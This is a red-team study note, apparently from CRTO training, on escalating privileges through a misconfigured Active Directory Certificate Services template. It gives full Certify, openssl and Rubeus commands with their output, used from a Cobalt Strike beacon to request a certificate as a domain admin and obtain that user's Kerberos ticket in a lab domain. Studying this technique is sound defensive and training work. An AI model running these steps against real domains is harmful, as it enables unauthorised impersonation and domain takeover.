
Requires the presence of an infrastructure with Active Directory Certificate Services.

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  

They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

#### 🖊️ via Cobalt Strike

1) [Certify](https://github.com/GhostPack/Certify) can also find vulnerable templates.

`beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable`

Example output:

![[customuser.png]]

2) Using the example output let's analyze some details

-  This template is served by _sub-ca_ machine.
-  The template is called _CustomUser_.
-  _ENROLLEE_SUPPLIES_SUBJECT_ is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
-  The certificate usage has _Client Authentication_ set.
-  _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.

3) This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication. In this example we request a certificate in the name of another user:

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

[*] Action: Request a Certificates
[*] Current user context    : DEV\bfarmer
[*] No subject name specified, using current context as subject.

[*] Template                : CustomUser
[*] Subject                 : CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io
[*] AltName                 : nlamb

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\sub-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 11

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

4) Copy the whole certificate (both the private key and certificate) and save it to `cert.pem` .  Then use the provided `openssl` command to convert it to pfx format.

```
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
```

5) Convert `cert.pfx` into a base64 encoded string so it can be used with Rubeus
`ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0`

6) Then use `asktgt` to request a TGT for the user using the certificate.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap`




#### ⚠ Opsec




### Properties
---
📆 created   {{20-02-2024}} 10:14
🏷️ tags: #redteam #crto 

---

